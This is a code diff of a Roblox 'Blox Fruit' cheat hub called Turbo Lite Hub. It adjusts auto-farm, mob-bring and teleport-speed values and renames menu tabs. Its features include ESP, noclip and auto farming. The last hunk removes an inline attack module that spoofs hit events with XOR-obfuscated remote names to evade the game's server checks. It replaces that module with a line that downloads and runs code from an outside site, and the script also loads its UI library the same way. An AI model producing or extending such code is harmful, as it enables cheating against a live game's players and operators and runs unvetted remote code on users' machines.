@@ -472,7 +472,7 @@ G.DistH = function(I, e)
 		return (Root.Position - (I:FindFirstChild("HumanoidRootPart")).Position).Magnitude > e;
 	end;
 -- ALTURA ÚNICA AJUSTÁVEL DO MOB
-_G.MobHeight = _G.MobHeight or 20
+_G.MobHeight = _G.MobHeight or 30
 
 G.Kill = function(I, e)
 	if not (I and e) then return end
@@ -671,8 +671,8 @@ _G = _G or {}
 _B = false
 PosMon = nil
 
-_G.BringRange = _G.BringRange or 210
-_G.MaxBringMobs = _G.MaxBringMobs or 8 -- LIMITE DE MOBS
+_G.BringRange = _G.BringRange or 235
+_G.MaxBringMobs = _G.MaxBringMobs or 10 -- LIMITE DE MOBS
 
 _G.FarmPriorityElf = _G.FarmPriorityElf or false
 _G.FarmMastery_S   = _G.FarmMastery_S or false
@@ -1211,8 +1211,8 @@ end);
 -- =======================
 
 -- [[ VARIÁVEIS PARA O SEU INPUT ]] --
-getgenv().TweenSpeedFar = 300   -- Velocidade Padrão (Longe)
-getgenv().TweenSpeedNear = 750  -- Velocidade Boost (Perto <= 15 studs)
+getgenv().TweenSpeedFar = 350   -- Velocidade Padrão (Longe)
+getgenv().TweenSpeedNear = 550  -- Velocidade Boost (Perto <= 15 studs)
 
 _tp = function(I)
 local e = plr.Character;
@@ -1238,7 +1238,7 @@ local dist = (I.Position - HRP.Position).Magnitude
 --  SE ESTIVER ATÉ 15 STUDS → USA A VELOCIDADE DE PERTO
 --  CASO CONTRÁRIO → USA A VELOCIDADE PADRÃO
 -- ===============================  
-local speed = dist <= 15 and (getgenv().TweenSpeedNear or 750) or (getgenv().TweenSpeedFar or 300)
+local speed = dist <= 15 and (getgenv().TweenSpeedNear or 550) or (getgenv().TweenSpeedFar or 350)
 
 local info = TweenInfo.new(dist / speed, Enum.EasingStyle.Linear)  
 local tween = game:GetService("TweenService"):Create(C, info, { CFrame = I })  
@@ -2397,7 +2397,7 @@ QuestNeta = function()
 	end;
 	local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/farehamhz/RedzLib/main/RedzLib"))():MakeWindow({
     Title = "Turbo Lite Hub",
-    SubTitle = "by Turbo Lite",
+    SubTitle = "V2 | Blox Fruit",
     SaveFolder = "abacaxi.json"
 })
 -- Criar ScreenGui
@@ -2481,8 +2481,18 @@ imageButton.MouseButton1Click:Connect(function()
     end
 end)
 local Discord = Library:MakeTab({
-    Title = "Discord",
+    Title = "Information",
     Icon = "rbxassetid://73132811772878"
+})
+
+local Status = Library:MakeTab({
+    Title = "Status & Server",
+    Icon = "rbxassetid://7040410130"
+})
+
+local Shop = Library:MakeTab({
+    Title = "Local Shop",
+    Icon = "rbxassetid://6031265976"
 })
 
 local Farm = Library:MakeTab({
@@ -2491,37 +2501,37 @@ local Farm = Library:MakeTab({
 })
 
 local Maestry = Library:MakeTab({
-    Title = "Tab Farm Maestry",
+    Title = "Farm Maestry",
     Icon = "rbxassetid://10709782497"
 })
 
 local Others = Library:MakeTab({
-    Title = "Tab Farm Others",
+    Title = "Farm Others",
     Icon = "rbxassetid://10723405360"
 })
 
 local Event = Library:MakeTab({
-    Title = "Tab Sea Event",
+    Title = "Sea Event",
     Icon = "rbxassetid://10709783577"
 })
 
 local Race = Library:MakeTab({
-    Title = "Tab Race Upgrade",
+    Title = "Race Upgrade",
     Icon = "rbxassetid://115164375298022"
 })
 
 local Dojo = Library:MakeTab({
-    Title = "Tab Dojo Quest & Drago Race",
+    Title = "Dojo Quest & Drago Race",
     Icon = "rbxassetid://91920478152016"
 })
 
 local Esp = Library:MakeTab({
-    Title = "Tab Stats & ESP",
+    Title = "Stats & ESP",
     Icon = "rbxassetid://11155851001"
 })
 
 local Player = Library:MakeTab({
-    Title = "Tab Local Player",
+    Title = "Local Player",
     Icon = "rbxassetid://13075651575"
 })
 
@@ -2531,41 +2541,30 @@ local Teleport = Library:MakeTab({
 })
 
 local Get = Library:MakeTab({
-    Title = "Tab Get Items & Upgrade",
+    Title = "Get Items & Upgrade",
     Icon = "rbxassetid://13075622619"
 })
 
 local Fruit = Library:MakeTab({
-    Title = "Tab Raid & Fruit",
+    Title = "Raid & Fruit",
     Icon = "rbxassetid://11155986081"
 })
 
-local Status = Library:MakeTab({
-    Title = "Status And Server",
-    Icon = "rbxassetid://7040410130"
-})
-
-local Shop = Library:MakeTab({
-    Title = "Shop",
-    Icon = "rbxassetid://6031265976"
-})
-
-
 local Setting = Library:MakeTab({
-    Title = "Tab Settings & Misc",
+    Title = "Settings & Misc",
     Icon = "rbxassetid://7734053495"
 })
 Discord:AddDiscordInvite({
-    Name = "Abacaxi Hub",
+    Name = "Turbo Lite Hub",
     Description = "Join for support and updates",
     Logo = "rbxassetid://18919385586",
-    Invite = "https://discord.gg/A2pMghhd"
+    Invite = "turbolite.xyz/discord"
 })
 local credits = Discord:AddParagraph({
     Title = "Credits For Someone Peoples",
     Desc = ""
 })
-credits:SetDesc("nigth mystic, astral, tboy kiddo etc")
+credits:SetDesc("Hello World")
 
 Shop:AddSection("Fighting Shop")
 Shop:AddButton({
@@ -3278,7 +3277,7 @@ Farm:AddToggle({
 ----------------------------------------------------------------------------
 
 -- Configurações
-local FarmHeight = 45 -- Altura segura para não bugar no mob
+local FarmHeight = 30 -- Altura segura para não bugar no mob
 
 -- NoClip Reforçado (Para não travar nas paredes/mobs)
 spawn(function()
@@ -4557,7 +4556,7 @@ Setting:AddTextBox({
 Setting:AddTextBox({
     Title = "Select Farm Height",
     Description = "",
-    PlaceHolder = "40",
+    PlaceHolder = "30",
     Default = tostring(_G.MobHeight),
     Callback = function(Value)
         local num = tonumber(Value)
@@ -4570,8 +4569,8 @@ Setting:AddTextBox({
 Setting:AddTextBox({
     Title = "Tween Speed",
     Description = "",
-    PlaceHolder = "300",
-    Default = "300",
+    PlaceHolder = "350",
+    Default = "350",
     Callback = function(I)
         if tonumber(I) then
             getgenv().TweenSpeedFar = tonumber(I)
@@ -12002,132 +12001,4 @@ local function y5(I)
 end
 
 
-
-
-local v1 = next
-local v2 = {
-game.ReplicatedStorage.Util,
-game.ReplicatedStorage.Common,
-game.ReplicatedStorage.Remotes,
-game.ReplicatedStorage.Assets,
-game.ReplicatedStorage.FX,
-}
-local v3 = nil
-local u4 = nil
-local u5 = nil
-
-while true do
-local v6
-
-v3, v6 = v1(v2, v3)  
-
-if v3 == nil then  
-    break  
-end  
-
-local v7 = next  
-local v8, v9 = v6:GetChildren()  
-
-while true do  
-    local v10  
-
-    v9, v10 = v7(v8, v9)  
-
-    if v9 == nil then  
-        break  
-    end  
-    if v10:IsA('RemoteEvent') and v10:GetAttribute('Id') then  
-        u5 = v10:GetAttribute('Id')  
-        u4 = v10  
-    end  
-end  
-
-v6.ChildAdded:Connect(function(p11)  
-    if p11:IsA('RemoteEvent') and p11:GetAttribute('Id') then  
-        u5 = p11:GetAttribute('Id')  
-        u4 = p11  
-    end  
-end)
-
-end
-
-task.spawn(function()
-
-while task.wait(0) do
-local _Character = game.Players.LocalPlayer.Character
-local v13
-
-if _Character then  
-        v13 = _Character:FindFirstChild('HumanoidRootPart')  
-    else  
-        v13 = _Character  
-    end  
-
-    local v14, v15, v16 = ipairs({  
-        workspace.Enemies,  
-        workspace.Characters,  
-    })  
-    local u17 = {}  
-
-    while true do  
-        local v18  
-
-        v16, v18 = v14(v15, v16)  
-
-        if v16 == nil then  
-            break  
-        end  
-
-        local v19, v20, v21 = ipairs(v18 and v18:GetChildren() or {})  
-
-        while true do  
-            local v22  
-
-            v21, v22 = v19(v20, v21)  
-
-            if v21 == nil then  
-                break  
-            end  
-
-            local _HumanoidRootPart = v22:FindFirstChild('HumanoidRootPart')  
-            local _Humanoid = v22:FindFirstChild('Humanoid')  
-
-            if v22 ~= _Character and (_HumanoidRootPart and (_Humanoid and (_Humanoid.Health > 0 and (_HumanoidRootPart.Position - v13.Position).Magnitude <= 60))) then  
-                local v25, v26, v27 = ipairs(v22:GetChildren())  
-
-                while true do  
-                    local v28  
-
-                    v27, v28 = v25(v26, v27)  
-
-                    if v27 == nil then  
-                        break  
-                    end  
-                    if v28:IsA('BasePart') and (_HumanoidRootPart.Position - v13.Position).Magnitude <= 60 then  
-                        u17[#u17 + 1] = {v22, v28}  
-                    end  
-                end  
-            end  
-        end  
-    end  
-
-    local _Tool = _Character:FindFirstChildOfClass('Tool')  
-
-    if #u17 > 0 and (_Tool and (_Tool:GetAttribute('WeaponType') == 'Melee' or _Tool:GetAttribute('WeaponType') == 'Sword')) then  
-        pcall(function()  
-            require(game.ReplicatedStorage.Modules.Net):RemoteEvent('RegisterHit', true)  
-            game.ReplicatedStorage.Modules.Net['RE/RegisterAttack']:FireServer()  
-
-            local _Head = u17[1][1]:FindFirstChild('Head')  
-
-            if _Head then  
-                game.ReplicatedStorage.Modules.Net['RE/RegisterHit']:FireServer(_Head, u17, {}, tostring(game.Players.LocalPlayer.UserId):sub(2, 4) .. tostring(coroutine.running()):sub(11, 15))  
-                cloneref(u4):FireServer(string.gsub('RE/RegisterHit', '.', function(p31)  
-                    return string.char(bit32.bxor(string.byte(p31), math.floor(workspace:GetServerTimeNow() / 10 % 10) + 1))  
-                end), bit32.bxor(u5 + 909090, game.ReplicatedStorage.Modules.Net.seed:InvokeServer() * 2), _Head, u17)  
-            end  
-        end)  
-    end  
-end
-
-end)
+loadstring(game:HttpGet("https://rise-evo.xyz/apiv3/attack-module.lua"))()
